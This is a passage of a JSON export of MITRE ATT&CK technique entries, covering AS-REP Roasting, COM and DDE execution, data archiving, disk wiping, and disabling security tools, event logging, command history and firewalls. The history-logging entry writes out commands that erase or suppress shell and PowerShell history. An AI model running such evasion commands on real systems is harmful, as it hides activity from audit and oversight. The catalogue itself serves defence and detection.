encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline <a href=\"https://attack.mitre.org/techniques/T1110/002\">Password Cracking</a> attacks similarly to <a href=\"https://attack.mitre.org/techniques/T1558/003\">Kerberoasting</a> and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) <!-- raw HTML omitted --><!-- raw HTML omitted -->An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Cracked hashes may enable <a href=\"https://attack.mitre.org/tactics/TA0003\">Persistence</a>, <a href=\"https://attack.mitre.org/tactics/TA0004\">Privilege Escalation</a>, and <a href=\"https://attack.mitre.org/tactics/TA0008\">Lateral Movement</a> via access to <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>.(Citation: SANS Attacking Kerberos Nov 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "Harmj0y Roasting AS-REPs Jan 2017",
        "url": "http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/",
        "description": "HarmJ0y. (2017, January 17). Roasting AS-REPs. Retrieved August 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Kerberos Preauth 2014",
        "url": "https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx",
        "description": "Sanyal, M.. (2014, March 18). Kerberos Pre-Authentication: Why It Should Not Be Disabled. Retrieved August 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Stealthbits Cracking AS-REP Roasting Jun 2019",
        "url": "https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/",
        "description": "Jeff Warren. (2019, June 27). Cracking Active Directory Passwords with AS-REP Roasting. Retrieved August 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "SANS Attacking Kerberos Nov 2014",
        "url": "https://redsiege.com/kerberoast-slides",
        "description": "Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity Cracking Kerberos Dec 2015",
        "url": "https://adsecurity.org/?p=2293",
        "description": "Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detecting Kerberoasting Feb 2018",
        "url": "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/",
        "description": "Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4768 TGT 2017",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768",
        "description": "Microsoft. (2017, April 19). 4768(S, F): A Kerberos authentication ticket (TGT) was requested. Retrieved August 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
    "platform": "windows",
    "tid": "T1559.001",
    "technique": "Component Object Model",
    "tactic": "execution",
    "datasources": "dll-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM)<!-- raw HTML omitted --><!-- raw HTML omitted -->Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and <a href=\"https://attack.mitre.org/techniques/T1059/005\">Visual Basic</a>.(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a>, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ProjectZero File Write EoP Apr 2018",
        "url": "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html",
        "description": "Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma MMC20 COM Jan 2017",
        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d",
    "platform": "windows",
    "tid": "T1559.002",
    "technique": "Dynamic Data Exchange",
    "tactic": "execution",
    "datasources": "dll-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a>, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "BleepingComputer DDE Disabled in Word Dec 2017",
        "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/",
        "description": "Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ADV170021 Dec 2017",
        "url": "https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021",
        "description": "Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DDE Advisory Nov 2017",
        "url": "https://technet.microsoft.com/library/security/4053440",
        "description": "Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost PS DDE May 2016",
        "url": "https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/",
        "description": "El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kettle CSV DDE Aug 2014",
        "url": "https://www.contextis.com/blog/comma-separated-vulnerabilities",
        "description": "Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Reviving DDE Jan 2018",
        "url": "https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee",
        "description": "Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost MacroLess DDE Oct 2017",
        "url": "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/",
        "description": "Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "NVisio Labs DDE Detection Oct 2017",
        "url": "https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/",
        "description": "NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
    "platform": "linux|macos|windows",
    "tid": "T1560.001",
    "technique": "Archive via Utility",
    "tactic": "collection",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data.<!-- raw HTML omitted --><!-- raw HTML omitted -->Some 3rd party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems.</p>\n",
    "technique_references": [
      {
        "source_name": "7zip Homepage",
        "url": "https://www.7-zip.org/",
        "description": "I. Pavlov. (2019). 7-Zip. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "WinRAR Homepage",
        "url": "https://www.rarlab.com/",
        "description": "A. Roshal. (2020). RARLAB. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "WinZip Homepage",
        "url": "https://www.winzip.com/win/en/",
        "description": "Corel Corporation. (2020). WinZip. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia File Header Signatures",
        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6",
    "platform": "linux|macos|windows",
    "tid": "T1560.002",
    "technique": "Archive via Library",
    "tactic": "collection",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including <a href=\"https://attack.mitre.org/techniques/T1059/006\">Python</a> rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.<!-- raw HTML omitted --><!-- raw HTML omitted -->Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.</p>\n",
    "technique_references": [
      {
        "source_name": "PyPI RAR",
        "url": "https://pypi.org/project/rarfile/",
        "description": "mkz. (2020). rarfile 3.1. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "libzip",
        "url": "https://libzip.org/",
        "description": "D. Baron, T. Klausner. (2020). libzip. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Zlib Github",
        "url": "https://github.com/madler/zlib",
        "description": "madler. (2017). zlib. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia File Header Signatures",
        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b",
    "platform": "linux|macos|windows",
    "tid": "T1560.003",
    "technique": "Archive via Custom Method",
    "tactic": "collection",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)</p>\n",
    "technique_references": [
      {
        "source_name": "ESET Sednit Part 2",
        "url": "http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf",
        "description": "ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac",
    "platform": "linux|macos|windows",
    "tid": "T1561.001",
    "technique": "Disk Content Wipe",
    "tactic": "impact",
    "datasources": "kernel-drivers|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like <a href=\"https://attack.mitre.org/software/S0364\">RawDisk</a> to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from <a href=\"https://attack.mitre.org/techniques/T1485\">Data Destruction</a> because sections of the disk are erased instead of individual files.<!-- raw HTML omitted --><!-- raw HTML omitted -->To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>, <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>, and <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a>.(Citation: Novetta Blockbuster Destructive Malware)</p>\n",
    "technique_references": [
      {
        "source_name": "Novetta Blockbuster",
        "url": "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf",
        "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Novetta Blockbuster Destructive Malware",
        "url": "https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf",
        "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "DOJ Lazarus Sony 2018",
        "url": "https://www.justice.gov/opa/press-release/file/1092091/download",
        "description": "Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
    "platform": "linux|macos|windows",
    "tid": "T1561.002",
    "technique": "Disk Structure Wipe",
    "tactic": "impact",
    "datasources": "kernel-drivers|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. <a href=\"https://attack.mitre.org/techniques/T1561/002\">Disk Structure Wipe</a> may be performed in isolation, or along with <a href=\"https://attack.mitre.org/techniques/T1561/001\">Disk Content Wipe</a> if all sectors of a disk are wiped.<!-- raw HTML omitted --><!-- raw HTML omitted -->To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>, <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>, and <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a>.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Symantec Shamoon 2012",
        "url": "https://www.symantec.com/connect/blogs/shamoon-attacks",
        "description": "Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Shamoon Nov 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html",
        "description": "FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Shamoon Nov 2016",
        "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
        "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky StoneDrill 2017",
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
        "description": "Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Shamoon3 2018",
        "url": "https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/",
        "description": "Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
    "platform": "windows|macos|linux",
    "tid": "T1562.001",
    "technique": "Disable or Modify Tools",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|services|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/578.html",
        "description": "none",
        "external_id": "CAPEC-578"
      }
    ]
  },
  {
    "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
    "platform": "windows",
    "tid": "T1562.002",
    "technique": "Disable Windows Event Logging",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.</p>\n",
    "technique_references": [
      {
        "source_name": "Windows Log Events",
        "url": "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/",
        "description": "Franklin Smith. (n.d.). Windows Security Log Events. Retrieved February 21, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
    "platform": "linux|macos|windows",
    "tid": "T1562.003",
    "technique": "Impair Command History Logging",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|environment-variable|file-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they’ve done. <!-- raw HTML omitted --><!-- raw HTML omitted -->On Linux and macOS, command history is tracked in a file pointed to by the environment variable <!-- raw HTML omitted -->HISTFILE<!-- raw HTML omitted -->. When a user logs off a system, this information is flushed to a file in the user’s home directory called <!-- raw HTML omitted -->~/.bash_history<!-- raw HTML omitted -->. The <!-- raw HTML omitted -->HISTCONTROL<!-- raw HTML omitted --> environment variable keeps track of what should be saved by the <!-- raw HTML omitted -->history<!-- raw HTML omitted --> command and eventually into the <!-- raw HTML omitted -->~/.bash_history<!-- raw HTML omitted --> file when a user logs out. <!-- raw HTML omitted -->HISTCONTROL<!-- raw HTML omitted --> does not exist by default on macOS, but can be set by the user and will be respected.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may clear the history environment variable (<!-- raw HTML omitted -->unset HISTFILE<!-- raw HTML omitted -->) or set the command history size to zero (<!-- raw HTML omitted -->export HISTFILESIZE=0<!-- raw HTML omitted -->) to prevent logging of commands. Additionally, <!-- raw HTML omitted -->HISTCONTROL<!-- raw HTML omitted --> can be configured to ignore commands that start with a space by simply setting it to “ignorespace”. <!-- raw HTML omitted -->HISTCONTROL<!-- raw HTML omitted --> can also be set to ignore duplicate commands by setting it to “ignoredups”. In some Linux systems, this is set by default to “ignoreboth” which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.<!-- raw HTML omitted --><!-- raw HTML omitted -->On Windows systems, the <!-- raw HTML omitted -->PSReadLine<!-- raw HTML omitted --> module tracks commands used in all PowerShell sessions and writes them to a file (<!-- raw HTML omitted -->$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt<!-- raw HTML omitted --> by default). Adversaries may change where these logs are saved using <!-- raw HTML omitted -->Set-PSReadLineOption -HistorySavePath {File Path}<!-- raw HTML omitted -->. This will cause <!-- raw HTML omitted -->ConsoleHost_history.txt<!-- raw HTML omitted --> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <!-- raw HTML omitted -->Set-PSReadlineOption -HistorySaveStyle SaveNothing<!-- raw HTML omitted -->.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/13.html",
        "description": "none",
        "external_id": "CAPEC-13"
      },
      {
        "source_name": "Microsoft PowerShell Command History",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7",
        "description": "Microsoft. (2020, May 13). About History. Retrieved September 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos PowerShell command audit",
        "url": "https://community.sophos.com/products/intercept/early-access-program/f/live-discover-response-queries/121529/live-discover---powershell-command-audit",
        "description": "jak. (2020, June 27). Live Discover - PowerShell command audit. Retrieved August 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos PowerShell Command History Forensics",
        "url": "https://community.sophos.com/products/malware/b/blog/posts/powershell-command-history-forensics",
        "description": "Vikas, S. (2020, August 26). PowerShell Command History Forensics. Retrieved September 4, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b",
    "platform": "linux|macos|windows",
    "tid": "T1562.004",
    "technique": "Disable or Modify System Firewall",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.<!-- raw HTML omitted --><!-- raw HTML omitted -->Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da",
    "platform": "windows|macos|linux",
    "tid": "T1562.006",
    "technique": "Indicator Blocking",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring|sensor-health-and-status",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
